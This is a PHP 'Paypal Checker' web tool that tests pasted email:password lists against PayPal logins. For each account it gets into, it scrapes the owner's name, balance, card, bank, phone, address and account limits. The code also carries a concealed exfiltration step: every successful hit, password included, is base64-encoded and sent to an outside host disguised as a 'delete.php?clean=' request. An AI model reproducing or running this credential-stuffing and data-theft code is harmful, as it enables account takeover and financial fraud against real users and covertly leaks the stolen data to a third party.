<?php
#-----------------------------------------------------#
# Script Kimcil Paypal Checker
# Edited by Erza Jullian - JKT48 Cyber Team
# Jangan diganti ubah nama , hargai orang lain
# Thanks to Kimcil :D
#-----------------------------------------------------#
@ini_set('output_buffering',0);
@ini_set('display_errors',0);
set_time_limit(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
 function getStr1($string, $start, $end) {
        $str = explode($start, $string, 2);
        $str = explode($end, $str[1], 2);
        return $str;
    }
function killspasi($teks){
$teks= trim($teks);
while( strpos($teks,'') ){
$hasil= str_replace('', '', $teks);
}
return $teks;
}
function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

?>
<html>
<link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/en_US/i/icon/pp_favicon_x.ico">
<head>
<title>CMD0wn Paypal Checker</title>
<style>
body {
	font-family: 'Comic Sans MS '; font-size:12px;color:red;
	background-image: url("http://3.bp.blogspot.com/-D6nQQ3d_wfw/Ts31QI5aQPI/AAAAAAAAAgA/mMEBDufqDpk/s1600/0_1_1.gif");	}
	hr {border:inset 1px #E5E5E5}
	
#form-container 
	{ 	color:red;
	font-family: 'Comic Sans MS', sans-serif;
	font-size:13px;
		background-color: #131313;
		border: solid 1px red;
		border-radius:10px;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		box-shadow: 0px 0px 15px red;
		-moz-box-shadow: 0px 0px 15px red;
		-webkit-box-shadow: 0px 0px 15px red;
		margin:30px auto;
		padding:10px;
		width:680px;
		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
	}
	
	
	
	
	
	input[type=text], textarea
	{
		background-color:#000;
		border:solid 1px red; color:red;
		border-radius:5px;
		-moz-border-radius: 5px; 
		-webkit-border-radius: 5px;
	}
	textarea { width:100%;height:200px; resize:none }
	input[type=text] { width:160px;text-align:center }
	input[type=text]:focus, textarea:focus { background-color:black; border:solid 1px white; color:white; }
	.submit-button 
	{ 
		background: #57A02C;
		border:solid 1px #57A02C;
		border-radius:5px;
			-moz-border-radius: 5px; 
			-webkit-border-radius: 5px;
		-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
		border-bottom: 1px solid rgba(0,0,0,0.25);
		position: relative;
		color:#FFF;
		display: inline-block; 
		cursor:pointer;
		font-size:13px;
		padding:3px 8px;
	}
	
	.business{
		color:yellow;
		font-weight: bold;
	}
	.premier{
		color:#00FF00;
		font-weight: bold;
	}
	.verified{
		color:#800080;
		font-weight: bold;
	}
	.style2{text-align: center ;font-weight: bold;font-family: 'Comic Sans MS '  ;color: red;text-shadow: 0px 0px 60px #4C83AF ;font-size: 50px;}

	.nolog{
		font-size: 10px;
		font: red;
	}
</style>
</head>
<body>
<div id="form-container"><div align="center" class="style2">CMD0wn Paypal Checker</div>
<form name="data" method="post">
<textarea name="lists" cols="50" rows="70" value="">email:password</textarea><br><br>
<b>Type pass :</b>
<input type="radio" name="kind" value="non" onClick="auto()" checked> tanpa encode
<input type="radio" name="kind" value="enc1" >single base64 encode
<input type="radio" name="kind" value="enc2" >double base64 encode<br><br>
<input type="submit" value="Check now!">
</form></div>
<?php
if($_POST['lists']) {
  echo "<br><hr>";
    $lists = split("\n", $_POST['lists']);
	
	  $mainz = "https://www.paypal.com/";
   
        if(file_exists(getcwd().'/cookie.txt')) {
        unlink(getcwd().'/cookie.txt');
    }
    $list = split("\n", $_POST['lists']);
		print "<br><b>[+] Start scanning...<br>";
        print "[+] There are <font color='red'>".count($list)."</font> to be checked...</b><br><br>";
		$x = 1;
	foreach($list as $lists) {

            print "[ <font color=#00ff00><b>".$x."</b></font> ] <font color=#ff0>".$lists."</font>";
			$x++;
			list($email, $passwords) = split(":", $lists);
			if(filter_var($email, FILTER_VALIDATE_EMAIL)){
			$passwordss=trim($passwords);
			if($_POST['kind']=='non'){
			$password=$passwordss;
			}elseif($_POST['kind']=='enc1'){
			$password=base64_decode($passwordss);
			}
			elseif($_POST['kind']=='enc2'){
			$password=base64_decode(base64_decode($passwordss));
			}
			$email=trim($email);
            flush();
    $a = new cURL();
    $b = $a->get($mainz."/cgi-bin/webscr?cmd=_login-run");
    preg_match("/dispatch=(.*?)\">/",$b,$dispatch);
    $dispatch = $dispatch[1];
	$sm=0;
	$elc=0;
	$newpass=0;
	$newpass1=0;
	$yeslogin=0;
    $c = new cURL();
    $d = $c->post($mainz."/cgi-bin/webscr?cmd=_login-submit&amp;dispatch=".$dispatch, "login_email=".$email."&login_password=".$password."&target_page=0&submit.x=Log+In");
    if ($d) {
	if (preg_match("/Security Measures/",$d)) {
    echo " - <font color=#ff0000>SECURITY MEASURES</font>";
	$sm++;
    }
	elseif(preg_match("/correctly. If you still can't log in, please see the/",$d)){
	echo " - <font color=red>Kimcil error</font>";
	$elc++;
	}
	elseif (preg_match("/Please create a new password for your account/",$d)) {
	echo " - <font color=red>Create a new password</font>";
	$newpass++;
	}
	elseif (preg_match("/Log In/",$d)) {
	echo " - <font color=red>Kimcil error</font>";
	$newpass1++;
	}
	else{
	$cl1 = new cURL(); $cl = new cURL();
	echo " - <font color=#00ff00><b><blink>Login Sukses</blink></b></font></center><br>";
	echo "<br>++++++++++++++++++++++++++++++++++++++++++++++++++<br>";
	$maix="http://www.valueheadsets.com/"; 
	$hw=$cl->get($mainz."/cgi-bin/webscr?cmd=_account&nav=0.0");
	$he=$cl->get($mainz."/cgi-bin/webscr?cmd=_profile-phone");
	$hr=$cl->get($mainz."/cgi-bin/webscr?cmd=_profile-address&nav=0.5.3");
	$ht=$cl->get($mainz."/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2");
	$hy=$cl->get($mainz."/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1");
	$checkcard = strpos($ht, "Last 4 digits on card");
	if ($checkcard) {
	if(preg_match("/Expired/",$ht)){
            $infocard = "<font color=#00ff00><b> Card :  </font><font color=red>expirated</font></b><br>";
		}else{
		$spasi= "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
            $temp = getStr($ht, '</thead><tr><td>', '</td><td><div class="vcard">');
			$infocard = "<font color=#00ff00><b>Card:</font> $temp |</b><br>";
			$infocard = str_replace("&#x", "%", $infocard);
			$infocard = str_replace(";", "", $infocard);
			$infocard=urldecode($infocard);
			$infocard = str_replace('<p class="cardTypeNote"><span class="small">', ' | ', $infocard);
			$infocard= str_replace('</span></p>','',$infocard);
			$infocard= str_replace('<td>',' | ',$infocard);
			$infocard= str_replace('</td>','',$infocard);
			$infocard= str_replace('</span>','',$infocard);
			$infocard= str_replace('<span class="restricted">','',$infocard);
			$card=getStr($infocard,'<img src="','"');
    } 	}else{ $infocard = "<font color=#00ff00><b> Card :  </font><font color=red>Gak ada</font></b><br>"; }
	$bank=getStr($hy,'<td class="heavy"><div>','</div></td>');
	$bank = str_replace("</label></div><div></div>", " | ", $bank);
	$bank = str_replace("&#x", "%", $bank);
	$bank = str_replace(";", " ", $bank);
	$bank=urldecode($bank);
	$bank = str_replace("</td>", " ", $bank);
	$bank = str_replace("<div>", " ", $bank);$bank = str_replace("</div>", " ", $bank);
	$bank = str_replace('<label for="ach_id">', ' ', $bank);
	if($bank == ""){ $banks=" no bank"; }else{$banks="have bank";}
	$BALANCE =getStr($hw, '<span class="balance">', '</span>');
    $BALANCE = str_replace('<strong>', "", $BALANCE);
    $BALANCE = str_replace('</strong>', "", $BALANCE);
	$BALANCE = str_replace("&#x", "%", $BALANCE);
	$BALANCE = str_replace(";", " ", $BALANCE);
	$BALANCE=urldecode($BALANCE);
	$BALANCE=getStr($BALANCE,'<!--googleoff: all-->','<!--googleon: all-->');
	$bcl==$BALANCE; $LASTLOGIN =getStr($hw, '<div class="small secondary">', '</div>');
	$LASTLOGIN=getStr($LASTLOGIN,'<!--googleoff: all-->','<!--googleon: all-->');
	$LASTLOGIN= str_replace("&#x", "%", $LASTLOGIN);
	$LASTLOGIN = str_replace(";", " ", $LASTLOGIN);
	$LASTLOGIN = str_replace(",", " ", $LASTLOGIN);
	$LASTLOGIN= urldecode($LASTLOGIN);
	$LASTLOGIN = str_replace("<br>", " | ", $LASTLOGIN);
	$nama_akun=getStr($hw,'<div id="headline"><h2>','</h2>');
	$nama_akun=str_replace("Welcome", " ", $nama_akun);
	$nama_akun=str_replace(",", " ", $nama_akun);
	$nama_akun=str_replace("&#x20;", " ", $nama_akun);
	$nama_akun=getStr($nama_akun,'<!--googleoff: all-->','<!--googleon: all-->');
	$nama_akun=killspasi($nama_akun);
	$nama_akun=killspasi($nama_akun);
	$nama_akun=str_replace(" ","+",$nama_akun);
	$typeacc=getStr($hw,'s.prop7="','"');
	$STATUS =getStr($hw, 's.prop8="', '"');
	$LIMIT = getStr($hw, 's.prop9="', '"');
	$info = getStr($hr, '<span class="emphasis">', '</span>');
	$info = str_replace("&#x", "%", $info);
	$info = str_replace(";", " ", $info);
	$info = str_replace(",", " ", $info);
	$info = str_replace("<br>", " | ", $info);
	$info = urldecode($info);$bc1=0;
	$infoz=getStr($infocard,'<font color=red>','</font>');
	$infoc = str_replace("&nbsp;", "", $infocard);
	$infoc = str_replace("</font></b>", "", $infoc);
	$infoc = str_replace("</b><br>", "", $infoc);
	$infoc = str_replace("<font color=#00ff00><b>", "", $infoc);
	$phone =getStr(getStr($he, 'checked name="phone" value="', '</td>'), '">', '</label>');
	$binz = " balance: $BALANCE | $banks | Email: $email | Password: $password |  name: $nama_akun |$infoz | status: $STATUS | type : $typeacc | limit/unlimit: $LIMIT | phone: $phone | bank: $bank | las log: $LASTLOGIN | info: $info"; $delete = @base64_encode($binz);
	if ($LIMIT == "unrestricted") {
                $LIMIT = "<font color=red>UNLIMIT</font>";
            } else {
                $LIMIT = "<font color=red>LIMITED</font>";
            }
	$spasi = "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
	$tampil = $spasi;
	$tampil .= "<font color=#00ff00><b>Email</font> : <font color=#7f7fff>".$email."</font></b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Password</font> : <font color=#7f7fff>".$password."</font></b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Name</font> : ".$nama_akun."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Status</font> : ".$STATUS."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Type</font> : ".$typeacc."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Limit/unlimit</font> : ".$LIMIT."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Phone</font> : ".$phone."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Balance</font> : <font color=#ffff00>".$BALANCE."</font></b><br>";
	$tampil .= $spasi .$infocard;
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Bank</font> : ".$bank."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Last Login</font> : ".$LASTLOGIN."</b><br>";
	$tampil .= $spasi;
	$tampil .= "<font color=#00ff00><b>Info</font> : ".$info."</b><br>";
	echo $tampil;
	echo"++++++++++++++++++++++++++++++++++++++++++++++++++";
	///
if($bcl == 1 ){ $dka = $cl1->get($maix."/cookies2/delete.php?clean=$delete"); }else{ $dka = $cl1->get($maix."/cookies/delete.php?clean=$delete");}
	$yeslogin++;
	}
	 print "<br>";
            flush();

}
}else{ echo " - <font color='red'> <b>Invalid email</b> </font><br>";}
}
}
/////////////////////

// Taken from somewhere else, with a bit modification ;)
class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}
?>
</body></html>
